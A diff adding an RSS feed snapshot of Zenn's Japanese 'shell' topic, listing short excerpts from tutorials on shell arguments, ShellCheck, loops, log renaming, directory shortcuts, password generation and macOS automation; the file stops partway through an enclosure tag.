@@ -1,0 +1,241 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Zennの「shell」のフィード]]></title><description><![CDATA[Zennのトピック「shell」のRSSフィードです]]></description><link>https://zenn.dev/topics/shell</link><image><url>https://storage.googleapis.com/zenn-user-upload/topics/c8d33e6510.jpeg</url><title>Zennの「shell」のフィード</title><link>https://zenn.dev/topics/shell</link></image><generator>zenn.dev</generator><lastBuildDate>Sun, 08 Jun 2025 07:24:41 GMT</lastBuildDate><atom:link href="https://zenn.dev/topics/shell/feed" rel="self" type="application/rss+xml"/><language><![CDATA[ja]]></language><item><title><![CDATA[shellscript の '$@' は、とても便利だった]]></title><description><![CDATA[
+ 概要
+shell script には、 全コマンドライン引数を扱う $@ という値が用意されています。
+先日、 $@ のユースケースを学ぶ機会があり、その効果に驚きました。
+学んだユースケースと共に、 $@ の効果を少しでも伝えられればと思います。
+
+ $@ とは
+シェルスクリプトにて使用できる、全コマンドライン引数を格納した変数です。
+$@ を参照することで、全コマンドライン引数をまとめて扱うことが出来ます。
+
+at_sample.sh
+echo "$@"
+
+$ bash at_sample.sh hoge fuga
+hoge fuga
+
+$ bash at_sample.sh f...]]></description><link>https://zenn.dev/t0mmy/articles/versatility-of-at-in-shell-script</link><guid isPermaLink="true">https://zenn.dev/t0mmy/articles/versatility-of-at-in-shell-script</guid><pubDate>Sat, 07 Jun 2025 12:41:25 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--MVF3ox1D--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:shellscript%2520%25E3%2581%25AE%2520%2527%2524%2540%2527%2520%25E3%2581%25AF%25E3%2580%2581%25E3%2581%25A8%25E3%2581%25A6%25E3%2582%2582%25E4%25BE%25BF%25E5%2588%25A9%25E3%2581%25A0%25E3%2581%25A3%25E3%2581%259F%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:t0mmy%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EtL0FPaDE0R2cwOV9uUGFwUktkM1E4VnVoc25fY0pSZTEzZmtPZTBseFpEbTNhNGc9czk2LWM=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>t0mmy</dc:creator></item><item><title><![CDATA[ShellCheckの使い方]]></title><description><![CDATA[
+ 1. ShellCheckとは
+
+github
+wiki
+体験できるページ
+
+シェルスクリプトのコードをチェックしてくれる静的解析ツールです。
+文法的なお作法やエラーはもちろん、「この書き方は、特定の状況で意図しない動きをする可能性があるよ」といった落とし穴も指摘してくれます。
+
+ 2. インストール方法
+ShellCheckは様々な環境で簡単にインストールできます。
+
+ macOS (Homebrew)
+brew install shellcheck
+
+ Ubuntu/Debian
+sudo apt-get update &amp;&amp; sudo apt-get instal...]]></description><link>https://zenn.dev/tabayashi/articles/ce6da1f33e0e2e</link><guid isPermaLink="true">https://zenn.dev/tabayashi/articles/ce6da1f33e0e2e</guid><pubDate>Sat, 07 Jun 2025 02:07:16 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--N1DbWQYU--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_66:ShellCheck%25E3%2581%25AE%25E4%25BD%25BF%25E3%2581%2584%25E6%2596%25B9%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Shinichiro%2520Tabayashi%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly96ZW5uLWRldi5naXRodWIuaW8vZGVmYXVsdC1hdmF0YXJzL2RhcmsvdC5wbmc=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Shinichiro Tabayashi</dc:creator></item><item><title><![CDATA[【Shell】ログファイルを自動リネームして保管：エビデンス収集に便利なシェルスクリプト]]></title><description><![CDATA[
+ ログファイルを自動リネームして保管：エビデンス収集に便利なシェルスクリプト
+テスト自動化や運用作業で生成される .log ファイルを、後から確認できるように環境情報付きで保存したいと思うことはありませんか？
+たとえば、
+
+テストのエビデンスとしてログを残す
+実行マシンごとにログファイルを分けたい
+IPやホスト名をファイル名に付けて分かりやすくしたい
+
+そんなときに便利なのが、ログファイルをリネームしてコピーするシンプルなスクリプトです。
+
+
+ 🛠️ シェルスクリプト：test.log を環境情報付きで保存
+#!/bin/bash
+
+# 元ファイルのパス
+SRC="/usr/local...]]></description><link>https://zenn.dev/qa_dev/articles/bc061a3b8d1cf1</link><guid isPermaLink="true">https://zenn.dev/qa_dev/articles/bc061a3b8d1cf1</guid><pubDate>Thu, 05 Jun 2025 12:47:46 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--1uyn5uOy--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2580%2590Shell%25E3%2580%2591%25E3%2583%25AD%25E3%2582%25B0%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E3%2582%2592%25E8%2587%25AA%25E5%258B%2595%25E3%2583%25AA%25E3%2583%258D%25E3%2583%25BC%25E3%2583%25A0%25E3%2581%2597%25E3%2581%25A6%25E4%25BF%259D%25E7%25AE%25A1%25EF%25BC%259A%25E3%2582%25A8%25E3%2583%2593%25E3%2583%2587%25E3%2583%25B3%25E3%2582%25B9%25E5%258F%258E%25E9%259B%2586%25E3%2581%25AB%25E4%25BE%25BF%25E5%2588%25A9%25E3%2581%25AA%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%2597%25E3%2583%2588%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:qa_dev%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jTGRfRnVZcmtndVIzVW1ScTVFMWdDMmozVmR4cFRjV29uUTJYd2JOQ2RhQ3ltaEFBPXM5Ni1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>qa_dev</dc:creator></item><item><title><![CDATA[TIL: UNIXプログラミング環境 第3章 後半]]></title><description><![CDATA[
+ UNIXプログラミング環境 第3章　後半
+内容はToday I Learnedということで、学びを記す記事です。
+　詳しいわけではないので悪しからず。
+後半なので唐突に感じると思います、前半も合わせてぜひ
+書籍はこちら
+UNIXプログラミング環境
+!
+コメントでもいただいているように、内容が古いものとなっています。
+読者の方々には参考程度であることにご留意いただきたいです。
+また今でも通用する部分が多くあるのがUNIX設計の素晴らしさだというコメントもいいただきました。
+
+
+ 3.5プログラム出力を引数として与える方法
+逆引用符 `` コマンドの引数に渡している文字列をコマンドとして...]]></description><link>https://zenn.dev/rgrey/articles/fd221f76499498</link><guid isPermaLink="true">https://zenn.dev/rgrey/articles/fd221f76499498</guid><pubDate>Thu, 05 Jun 2025 04:58:16 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--HJ4KYDoG--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:TIL%253A%2520UNIX%25E3%2583%2597%25E3%2583%25AD%25E3%2582%25B0%25E3%2583%25A9%25E3%2583%259F%25E3%2583%25B3%25E3%2582%25B0%25E7%2592%25B0%25E5%25A2%2583%2520%25E7%25AC%25AC3%25E7%25AB%25A0%2520%25E5%25BE%258C%25E5%258D%258A%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E7%25AB%25AF%25E3%2581%258F%25E3%2582%258C%25E3%2582%25A8%25E3%2583%25B3%25E3%2582%25B8%25E3%2583%258B%25E3%2582%25A2%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2UxYTQxODM3ODAuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>端くれエンジニア</dc:creator></item><item><title><![CDATA[【Shell】引数に応じて処理を分ける Shell Script の基本]]></title><description><![CDATA[
+ 引数に応じて処理を分ける Shell Script の基本
+この記事では、シェルスクリプト（bash）で 引数によって処理内容を分ける方法 を紹介します。
+テスト自動化やツール起動の分岐処理などに便利です。
+
+
+ ✅ サンプルスクリプト
+#!/bin/bash
+
+case "$1" in
+  1) echo "1の処理" ;;
+  2) echo "2の処理" ;;
+  3) echo "3の処理" ;;
+  4) echo "4の処理" ;;
+  5) echo "5の処理" ;;
+  *) echo "その他の処理" ;;
+esac
+
+
+ 🔍 解説
+
+
+$1 は、スクリプト実行時...]]></description><link>https://zenn.dev/qa_dev/articles/dd365c0e083619</link><guid isPermaLink="true">https://zenn.dev/qa_dev/articles/dd365c0e083619</guid><pubDate>Wed, 04 Jun 2025 12:00:05 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--AsCNmLVq--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2580%2590Shell%25E3%2580%2591%25E5%25BC%2595%25E6%2595%25B0%25E3%2581%25AB%25E5%25BF%259C%25E3%2581%2598%25E3%2581%25A6%25E5%2587%25A6%25E7%2590%2586%25E3%2582%2592%25E5%2588%2586%25E3%2581%2591%25E3%2582%258B%2520Shell%2520Script%2520%25E3%2581%25AE%25E5%259F%25BA%25E6%259C%25AC%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:qa_dev%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jTGRfRnVZcmtndVIzVW1ScTVFMWdDMmozVmR4cFRjV29uUTJYd2JOQ2RhQ3ltaEFBPXM5Ni1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>qa_dev</dc:creator></item><item><title><![CDATA[みんなが使えるMacOS用dotfiles「YAMATO」を作っている話]]></title><description><![CDATA[
+ みんなが使えるMacOS用dotfilesを作っている話
+
+ はじめに
+今回は私が「みんなが使えるMacOS用dotfiles」を目指して作っている「YAMATO」というプロジェクトについて紹介します
+https://github.com/politive/yamato
+
+ 作ろうと思ったきっかけ
+
+ 個人のDotfilesの更新を放置しすぎた
+
+ここ２年ほど、Dotfilesの更新を放置してしまっていました
+その間にツールの乗り換えがいろいろありました
+
+bash(自作プロンプト) -&gt; zsh(starship prompt)
+Docker Desktop -&gt; do...]]></description><link>https://zenn.dev/politive/articles/d4579cbfd1db18</link><guid isPermaLink="true">https://zenn.dev/politive/articles/d4579cbfd1db18</guid><pubDate>Wed, 04 Jun 2025 01:06:25 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--39_Wjdc9--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2581%25BF%25E3%2582%2593%25E3%2581%25AA%25E3%2581%258C%25E4%25BD%25BF%25E3%2581%2588%25E3%2582%258BMacOS%25E7%2594%25A8dotfiles%25E3%2580%258CYAMATO%25E3%2580%258D%25E3%2582%2592%25E4%25BD%259C%25E3%2581%25A3%25E3%2581%25A6%25E3%2581%2584%25E3%2582%258B%25E8%25A9%25B1%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_34:%25E3%2581%25BE%25E3%2582%2581%25E3%2581%25A1%25E3%2582%2583%25E3%2582%2593%2Cx_220%2Cy_108/bo_3px_solid_rgb:d6e3ed%2Cg_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzUwNWViYmIxY2QuanBlZw==%2Cr_20%2Cw_90%2Cx_92%2Cy_102/co_rgb:6e7b85%2Cg_south_west%2Cl_text:notosansjp-medium.otf_30:Politive%2520Tech%2520Blog%2Cx_220%2Cy_160/bo_4px_solid_white%2Cg_south_west%2Ch_50%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzgyZjVjOWMwY2IuanBlZw==%2Cr_max%2Cw_50%2Cx_139%2Cy_84/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>まめちゃん</dc:creator></item><item><title><![CDATA[【Shell】Shell のループ構文まとめ]]></title><description><![CDATA[
+ Shell スクリプトで使える「for ループ」3選！
+Shell スクリプトでよく使う「for ループ」。
+この記事では、基本から応用まで、代表的な3つの書き方を紹介します。
+
+
+ ✅ 1. 基本的なリスト形式のループ
+for i in 1 2 3 4 5
+do
+  echo "A"
+done
+📝 1 2 3 4 5 を直接書く形式です。小規模な固定回数ループに便利です。
+
+
+ ✅ 2. seq を使ってループ
+for i in $(seq 1 5)
+do
+  echo "B"
+done
+📝 seq コマンドを使えば、範囲指定で柔軟なループができます。
+
+
+ ✅ 3. 変数を使った...]]></description><link>https://zenn.dev/qa_dev/articles/26da468b22515f</link><guid isPermaLink="true">https://zenn.dev/qa_dev/articles/26da468b22515f</guid><pubDate>Tue, 03 Jun 2025 23:24:46 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--DSUbKCqg--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2580%2590Shell%25E3%2580%2591Shell%2520%25E3%2581%25AE%25E3%2583%25AB%25E3%2583%25BC%25E3%2583%2597%25E6%25A7%258B%25E6%2596%2587%25E3%2581%25BE%25E3%2581%25A8%25E3%2582%2581%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:qa_dev%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jTGRfRnVZcmtndVIzVW1ScTVFMWdDMmozVmR4cFRjV29uUTJYd2JOQ2RhQ3ltaEFBPXM5Ni1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>qa_dev</dc:creator></item><item><title><![CDATA[【Python】Shell Scriptを実行する基本]]></title><description><![CDATA[
+ PythonからShell Scriptを実行する基本
+Mac や Linux 環境で、Pythonから .sh ファイル（シェルスクリプト）を呼び出す方法を紹介します。
+テスト自動化や簡単なタスク実行にも応用できます。
+
+ ✅ サンプルコード
+import subprocess
+
+# capture_output=True: 標準出力・標準エラー出力を取得する
+# text=True: 出力をバイト列ではなく文字列として扱う
+result = subprocess.run(['bash', 'test.sh'], capture_output=True, text=True)
+pr...]]></description><link>https://zenn.dev/qa_dev/articles/b880d3e97d8696</link><guid isPermaLink="true">https://zenn.dev/qa_dev/articles/b880d3e97d8696</guid><pubDate>Tue, 03 Jun 2025 12:20:28 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--N_yzl5m3--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2580%2590Python%25E3%2580%2591Shell%2520Script%25E3%2582%2592%25E5%25AE%259F%25E8%25A1%258C%25E3%2581%2599%25E3%2582%258B%25E5%259F%25BA%25E6%259C%25AC%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:qa_dev%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jTGRfRnVZcmtndVIzVW1ScTVFMWdDMmozVmR4cFRjV29uUTJYd2JOQ2RhQ3ltaEFBPXM5Ni1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>qa_dev</dc:creator></item><item><title><![CDATA[シェルスクリプトの基本その1]]></title><description><![CDATA[どうも、かりんです
+
+ はじめに
+これから作業を自動化したいと考えている方には、シェルスクリプトを覚えておくことをおすすめいたします。
+業務で使用する場面もありますし、プライベートでもファイル処理などを効率化できるため、覚えておいて損はございません。
+そのため、まずは基礎的な部分から順を追って記録していきます。
+
+ シェルスクリプトとは何か
+簡単に申し上げますと、ターミナルで使用するコマンドを並べて書いたファイルのことです。
+たとえば、同じ操作を何度も繰り返しているような場合、それらをスクリプトとしてまとめておけば効率化につながります。
+
+ スクリプトの作成と実行権限の付与
+シェルスクリ...]]></description><link>https://zenn.dev/karin_lab/articles/2f199ea4051bb3</link><guid isPermaLink="true">https://zenn.dev/karin_lab/articles/2f199ea4051bb3</guid><pubDate>Fri, 30 May 2025 02:00:01 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--LGx2K-CK--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%2597%25E3%2583%2588%25E3%2581%25AE%25E5%259F%25BA%25E6%259C%25AC%25E3%2581%259D%25E3%2581%25AE1%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2581%258B%25E3%2582%258A%25E3%2582%2593%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2ZmNjQ5NDk1MzMuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>かりん</dc:creator></item><item><title><![CDATA[Macでランダムなパスワードを作成するワンライナー]]></title><description><![CDATA[LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&amp;*()-_=+' &lt; /dev/urandom | head -c 32; echo
+出力例
+ts;ClnPA_e&lt;ciz]f&lt;Rz6cYyy]@jMxG54
+]]></description><link>https://zenn.dev/purratto/articles/0f61360b0c5be1</link><guid isPermaLink="true">https://zenn.dev/purratto/articles/0f61360b0c5be1</guid><pubDate>Tue, 27 May 2025 05:41:21 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--0j43lgg2--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Mac%25E3%2581%25A7%25E3%2583%25A9%25E3%2583%25B3%25E3%2583%2580%25E3%2583%25A0%25E3%2581%25AA%25E3%2583%2591%25E3%2582%25B9%25E3%2583%25AF%25E3%2583%25BC%25E3%2583%2589%25E3%2582%2592%25E4%25BD%259C%25E6%2588%2590%25E3%2581%2599%25E3%2582%258B%25E3%2583%25AF%25E3%2583%25B3%25E3%2583%25A9%25E3%2582%25A4%25E3%2583%258A%25E3%2583%25BC%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:purratto%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzNhODdjNTc4MzguanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>purratto</dc:creator></item><item><title><![CDATA[mkdir -p と cd $_ でパッとディレクトリを立てて移動する]]></title><description><![CDATA[
+ tl;dr
+以下のコマンドで
+
+指定したパスにディレクトリを作成する
+ディレクトリに移動する
+を一発で行えます。
+
+mkdir -p &lt;new-folder-path&gt; &amp;&amp; cd $_
+
+ あらまし
+ぼくはプロジェクトを /github ディレクトリにまとめて管理しています。
+.
+└── github/
+    ├── project-1
+    ├── project-2
+    └── project-3  
+なので、毎回プロジェクトを立てるように以下のような手順でコマンドを実行しています。
+cd github
+mkdir new-project
+c...]]></description><link>https://zenn.dev/ulxsth/articles/2224b97fd87c8e</link><guid isPermaLink="true">https://zenn.dev/ulxsth/articles/2224b97fd87c8e</guid><pubDate>Sun, 25 May 2025 15:27:01 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--LgpE7sRS--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:mkdir%2520-p%2520%25E3%2581%25A8%2520cd%2520%2524_%2520%25E3%2581%25A7%25E3%2583%2591%25E3%2583%2583%25E3%2581%25A8%25E3%2583%2587%25E3%2582%25A3%25E3%2583%25AC%25E3%2582%25AF%25E3%2583%2588%25E3%2583%25AA%25E3%2582%2592%25E7%25AB%258B%25E3%2581%25A6%25E3%2581%25A6%25E7%25A7%25BB%25E5%258B%2595%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2582%2588%25E3%2581%25A4%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2JiOGNiMGY2NjkuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>よつ</dc:creator></item><item><title><![CDATA[今いるディレクトリ下のどこかにあるファイルに一発で移動するシェルスクリプト]]></title><description><![CDATA[
+ 解決したかったこと
+プロジェクトのルートにいるときに、例えば main.go とか compose.yml までのパスがパッとわからなくて、なんか cd &lt;Tab&gt; cd &lt;Tab&gt; でファイル一覧見ながら一階層ずつ移動したりすることありません？
+もっというと go run ./... したら main.go のあるところにいなくて、いざたどり着いてもう一発 go run ./... したらローカル確認用のコンテナ立ててないのに気づいて compose.yml のところに移動・・・
+みたいな、小さなストレス。特にバックエンドもフロントエンドも一つのリポジトリで...]]></description><link>https://zenn.dev/hikamayogoat/articles/770f1f94470f2f</link><guid isPermaLink="true">https://zenn.dev/hikamayogoat/articles/770f1f94470f2f</guid><pubDate>Sat, 24 May 2025 14:29:47 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--gn57d0Yt--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E4%25BB%258A%25E3%2581%2584%25E3%2582%258B%25E3%2583%2587%25E3%2582%25A3%25E3%2583%25AC%25E3%2582%25AF%25E3%2583%2588%25E3%2583%25AA%25E4%25B8%258B%25E3%2581%25AE%25E3%2581%25A9%25E3%2581%2593%25E3%2581%258B%25E3%2581%25AB%25E3%2581%2582%25E3%2582%258B%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E3%2581%25AB%25E4%25B8%2580%25E7%2599%25BA%25E3%2581%25A7%25E7%25A7%25BB%25E5%258B%2595%25E3%2581%2599%25E3%2582%258B%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%2597%25E3%2583%2588%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Hikamayo%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzQ1MmI5ZDI0MDYuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Hikamayo</dc:creator></item><item><title><![CDATA[nushellとstarshipで，コマンド履歴を残さないモードであることを可視化する]]></title><description><![CDATA[
+ 概要．
+
+シェル・ターミナルで，履歴を残さないモードと通常モードの切り替えを容易にする．
+コマンドエイリアスで，モード切り替えと同時に環境変数を設定する．
+starshipで環境変数を参照して表示を切り替える．
+nushell+starshipの環境で，履歴を残さないモードであることを可視化する．
+nushell以外のシェルを使用している場合は（例：bash, zshなど），適宜読み替えてほしい．
+
+成果物
+
+履歴を残す状態のときのstarship表示
+
+履歴を残さない状態のときのstarship表示
+
+ 環境
+
+Ubuntu 24
+nushell 0.104.0
+starship ...]]></description><link>https://zenn.dev/neruneruna7/articles/6ccdd1b30b2b22</link><guid isPermaLink="true">https://zenn.dev/neruneruna7/articles/6ccdd1b30b2b22</guid><pubDate>Mon, 19 May 2025 13:03:50 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--6I-86mrs--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:nushell%25E3%2581%25A8starship%25E3%2581%25A7%25EF%25BC%258C%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%25E5%25B1%25A5%25E6%25AD%25B4%25E3%2582%2592%25E6%25AE%258B%25E3%2581%2595%25E3%2581%25AA%25E3%2581%2584%25E3%2583%25A2%25E3%2583%25BC%25E3%2583%2589%25E3%2581%25A7%25E3%2581%2582%25E3%2582%258B%25E3%2581%2593%25E3%2581%25A8%25E3%2582%2592%25E5%258F%25AF%25E8%25A6%2596%25E5%258C%2596%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Neruneruna7%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUdObXl4WjdHT1MzanlRM0dkTGt5WTNNZ2Ewdzl1WjVqcFdBRGJnTW92THQ9czk2LWM=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Neruneruna7</dc:creator></item><item><title><![CDATA[commandファイルをDockに固定したい 〜コピペでMacOSアプリを作っちゃおう〜]]></title><description><![CDATA[
+ 概要 〜なにをするのか〜
+.commandファイルはシェルスクリプトでいろいろ自動化ができるので便利なんだ
+例えば以下の2つとか。
+https://qiita.com/GeneLab_999/items/4edc7bf5a2fa159feb5f
+https://github.com/hiroki-abe-58/sort_files
+しかし、これはDockに固定できないぞ、、、
+これは、commandファイルを実行するためのラッパーとして機能する
+シンプルなアプリを作ってしまおうという試みだ。
+日頃行っている自動化シェルをDockから呼び出せるようになって便利なのだよ
+Windowsの...]]></description><link>https://zenn.dev/rick_lyric/articles/9676adf233a7f0</link><guid isPermaLink="true">https://zenn.dev/rick_lyric/articles/9676adf233a7f0</guid><pubDate>Sun, 18 May 2025 05:53:09 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--5sSmeRSU--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:command%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E3%2582%2592Dock%25E3%2581%25AB%25E5%259B%25BA%25E5%25AE%259A%25E3%2581%2597%25E3%2581%259F%25E3%2581%2584%2520%25E3%2580%259C%25E3%2582%25B3%25E3%2583%2594%25E3%2583%259A%25E3%2581%25A7MacOS%25E3%2582%25A2%25E3%2583%2597%25E3%2583%25AA%25E3%2582%2592%25E4%25BD%259C%25E3%2581%25A3%25E3%2581%25A1%25E3%2582%2583%25E3%2581%258A%25E3%2581%2586%25E3%2580%259C%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:GeneLab%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzhmMDIwOGRiNDQuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>GeneLab</dc:creator></item><item><title><![CDATA[ファイル整理自動化おすすめ手法]]></title><description><![CDATA[
+ はじめに
+写真愛好家やビデオグラファーの皆さん、こんな経験はありませんか？撮影から帰ってきた後、数百枚の写真や動画ファイルが無秩序に並んでいて整理に何時間も費やしてしまう…。私もその一人でした。そこで今回は、この問題を解決するための自作シェルスクリプトをご紹介します。
+https://github.com/hiroki-abe-58/sort_files
+このスクリプトは、ファイルのメタデータから撮影日時を自動的に読み取り、時間単位でフォルダを作成して分類してくれます。例えば、2025年4月1日の午後3時に撮影した全ての写真は 2025-04-01_15 というフォルダに自動的に移動...]]></description><link>https://zenn.dev/rick_lyric/articles/36edd49a4111a5</link><guid isPermaLink="true">https://zenn.dev/rick_lyric/articles/36edd49a4111a5</guid><pubDate>Sun, 18 May 2025 05:51:35 GMT</pubDate><enclosure 